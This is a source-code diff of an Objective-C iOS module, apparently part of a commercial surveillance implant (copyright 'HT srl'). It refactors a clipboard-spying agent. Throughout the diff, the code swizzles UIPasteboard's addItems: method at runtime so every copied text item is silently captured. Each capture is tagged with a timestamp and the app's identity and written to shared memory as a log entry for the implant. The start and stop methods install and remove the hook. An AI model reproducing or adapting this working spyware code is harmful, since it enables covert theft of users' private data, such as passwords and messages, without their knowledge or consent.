@@ -7,161 +7,136 @@
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
+#import <objc/runtime.h>
 
 #import "RCSIAgentPasteboard.h"
 #import "RCSISharedMemory.h"
 #import "RCSICommon.h"
 
-#define LOG_DELIMITER 0xABADC0DE
-
 //#define DEBUG
 
-extern RCSISharedMemory *mSharedMemoryLogging;
+#define LOG_DELIMITER 0xABADC0DE
 
-@implementation myUIPasteboard
+@implementation agentPasteboard
 
++ (NSData*)getPastebordText:(NSArray*)items
+{
+  NSData  *clipboardContent = nil;
+  
+  for (int i=0; i<[items count]; i++) 
+    {
+      NSDictionary *tmpItem = (NSDictionary*)[items objectAtIndex:i];
+      
+      if (tmpItem) 
+        {
+          NSData *_data = nil;
+          
+          // get only text (iOS 3.x/4.x)
+          _data = [tmpItem objectForKey: @"public.utf8-plain-text"];
+          
+          // try to get another key (iOS5)
+          if (_data == nil)
+            _data = [tmpItem objectForKey:@"public.text"];
+          
+          if (_data == nil)
+            continue;
+          
+          if ([_data isKindOfClass: [NSString class]]) 
+            {
+              clipboardContent =
+              [(NSString*)_data dataUsingEncoding: NSUTF16LittleEndianStringEncoding 
+                             allowLossyConversion: YES];
+            }
+          else if ([_data isKindOfClass: [NSData class]] ||
+                   [_data isKindOfClass: [NSMutableData class]])
+            {
+              NSString *dataString = [[NSString alloc] initWithData: _data
+                                                           encoding: NSUTF8StringEncoding];                  
+              clipboardContent = 
+              [NSData dataWithData: [dataString dataUsingEncoding: NSUTF16LittleEndianStringEncoding
+                                             allowLossyConversion: YES]];
+              [dataString release];
+            }
+          
+          break;
+        }
+    }
+  
+  return clipboardContent;
+}
+  
 - (void)addItemsHook: (NSArray *)items
 {
+  [self addItemsHook: items];
+  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
-  int i;
   short unicodeNullTerminator = 0x0000;
   NSString      *_windowName;
   NSString      *_processName;
   NSMutableData *processName;
   NSMutableData *windowName;
-  NSData        *data = nil;
-
-  _processName = [[NSBundle mainBundle] bundleIdentifier];
-  _windowName  = [[[NSBundle mainBundle] bundleIdentifier] lastPathComponent];
-
-#ifdef DEBUG
-  NSLog(@"%s: logging clipboard items [%@]", __FUNCTION__, items);
-#endif
-
-  [self addItemsHook: items];
-
+  NSData        *clipboardContent = nil;
+  
   if (items)
-    {
-      // loop on dictionaries array
-      for (i=0; i<[items count]; i++) 
+    {   
+      clipboardContent = [agentPasteboard getPastebordText:items];
+      
+      if (clipboardContent == nil)
         {
-          NSDictionary *tmpItem = (NSDictionary*)[items objectAtIndex:i];
-
-          if (tmpItem) 
-            {
-              NSData *_data = nil;
-
-              // get only text
-              _data = [tmpItem objectForKey: @"public.utf8-plain-text"];
-
-              if (_data)
-                {
-#ifdef DEBUG
-                  NSLog(@"%s: logging clipboard item [%@]", __FUNCTION__, [_data class]);
-#endif
-                  if ([_data isKindOfClass: [NSString class]]) 
-                    {
-#ifdef DEBUG
-                      NSLog(@"%s: clipboard item is NSString", __FUNCTION__);
-#endif
-                      data = [(NSString*)_data dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-                    }
-                  else if ([_data isKindOfClass: [NSData class]] ||
-                           [_data isKindOfClass: [NSMutableData class]])
-                    {
-#ifdef DEBUG
-                      NSLog(@"%s: clipboard item is NSData", __FUNCTION__);
-#endif
-                      data = _data;
-                    }
-                  else
-                    continue;
-
-                  break;
-                }
-            }
-        }
-
-      if (data == nil)
-        {
-#ifdef DEBUG
-          NSLog(@"%s: no clipboard logging!", __FUNCTION__);
-#endif
           [pool release];
-
           return;
         }
-
-      NSString *dataString = [[NSString alloc] initWithData: data
-                                                   encoding: NSUTF8StringEncoding];
-
-      NSMutableData *clipboardContent = [[NSMutableData alloc] initWithData:
-                                              [dataString dataUsingEncoding:NSUTF16LittleEndianStringEncoding
-                                                       allowLossyConversion:true]];
-
+      
       NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
       NSMutableData *entryData = [[NSMutableData alloc] init];
-
-
+    
+      _processName = [[NSBundle mainBundle] bundleIdentifier];
+      _windowName  = [[[NSBundle mainBundle] bundleIdentifier] lastPathComponent];
+      
+      if (_windowName == nil || [_windowName length] == 0) 
+        _windowName = @"unknown";
+      
       time_t rawtime;
       struct tm *tmTemp;
-
-      processName  = [[NSMutableData alloc] initWithData:
-                         [_processName dataUsingEncoding:
-                         NSUTF16LittleEndianStringEncoding]];
 
       // Struct tm
       time (&rawtime);
       tmTemp = gmtime(&rawtime);
       tmTemp->tm_year += 1900;
       tmTemp->tm_mon  ++;
-
+      
       [entryData appendBytes: (const void *)tmTemp
                       length: sizeof (struct tm) - 0x8];
-
-      // Process Name
+      processName  = 
+        [[NSMutableData alloc] initWithData:[_processName dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+    
+      // Process Name + null terminator
       [entryData appendData: processName];
-      // Null terminator
       [entryData appendBytes: &unicodeNullTerminator
                       length: sizeof(short)];
 
-#ifdef DEBUG
-      NSLog(@"%s: process name [%@]", __FUNCTION__, processName);
-#endif    
-
-      if (_windowName == nil || [_windowName length] == 0) 
-        _windowName = @"unknown";
-
-      windowName = [[NSMutableData alloc] initWithData:
-                        [_windowName dataUsingEncoding:
-                        NSUTF16LittleEndianStringEncoding]];
-
+      [processName release];
+      
+      windowName = 
+        [[NSMutableData alloc] initWithData:[_windowName dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+      
+      // windowname + null terminator 
       [entryData appendData: windowName];
-      // Null terminator
       [entryData appendBytes: &unicodeNullTerminator
                       length: sizeof(short)];
-
-#ifdef DEBUG
-      NSLog(@"%s: window name [%@]", __FUNCTION__, windowName);
-#endif
-
-      // Clipboard
+      
+      [windowName release];
+    
+      // Clipboard + null terminator
       [entryData appendData: clipboardContent];
-
-      // Null terminator
-      [entryData appendBytes: &unicodeNullTerminator
-                      length: sizeof(short)];
-
+      [entryData appendBytes: &unicodeNullTerminator length: sizeof(short)];
+    
       // Delimiter
       uint32_t del = LOG_DELIMITER;
-      [entryData appendBytes: &del
-                      length: sizeof(del)];
+      [entryData appendBytes: &del length: sizeof(del)];
 
-      [windowName release];
-
-      [clipboardContent release];
-
+      
       shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
       shMemoryHeader->status          = SHMEM_WRITTEN;
       shMemoryHeader->agentID         = LOG_CLIPBOARD;
@@ -169,32 +144,83 @@ extern RCSISharedMemory *mSharedMemoryLogging;
       shMemoryHeader->commandType     = CM_LOG_DATA;
       shMemoryHeader->flag            = 0;
       shMemoryHeader->commandDataSize = [entryData length];
-
+      
       memcpy(shMemoryHeader->commandData,
              [entryData bytes],
              [entryData length]);
-
-      if ([mSharedMemoryLogging writeMemory: logData
-                                     offset: 0
-                              fromComponent: COMP_AGENT] == TRUE)
-        {
-#ifdef DEBUG
-          NSLog(@"setDataHook: clipboard logged: %@", dataString);
-#endif
-        }
-#ifdef DEBUG
-      else
-        NSLog(@"setDataHook: Error while logging clipboard to shared memory");
-#endif
-
+    
       [entryData release];
-      [dataString release];
+    
+      [[RCSISharedMemory sharedInstance] writeIpcBlob: logData];
+    
       [logData release];
     }
-
+  
   [pool release];
+}
 
-  return;
+- (id)init
+{
+  self = [super init];
+  
+  if (self != nil)
+    mAgentID = AGENT_CLIPBOARD;
+  
+  return self;
+}
+
+- (BOOL)start
+{
+  BOOL retVal = TRUE;
+  
+  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
+    {
+      Class className   = objc_getClass("UIPasteboard");
+      Class classSource = [self class];
+      
+      if (className != nil)
+        {
+          IMP newImpl = class_getMethodImplementation(classSource, @selector(addItemsHook:));
+          
+          [self swizzleByAddingIMP:className 
+                           withSEL:@selector(addItems:) 
+                    implementation:newImpl
+                      andNewMethod:@selector(addItemsHook:)];
+          
+          /*
+           * checking for a valid method swapping before return OK
+           * [self validateHook];
+           */
+          
+          [self setMAgentStatus: AGENT_STATUS_RUNNING];
+        
+        }
+    }
+  return retVal;
+}
+
+- (void)stop
+{
+  if ([self mAgentStatus] == AGENT_STATUS_RUNNING )
+    {
+      Class className = objc_getClass("UIPasteboard");
+      
+      if (className != nil)
+        {
+          IMP oldImpl = class_getMethodImplementation(className, @selector(addItemsHook:));
+        
+          [self swizzleByAddingIMP:className 
+                           withSEL:@selector(addItems:) 
+                    implementation:oldImpl
+                      andNewMethod:@selector(addItemsHook:)];
+          /*
+           * checking for a valid method swapping before return OK
+           * [self validateHook];
+           */
+          
+          [self setMAgentStatus: AGENT_STATUS_STOPPED];
+        } 
+    }
 }
 
 @end
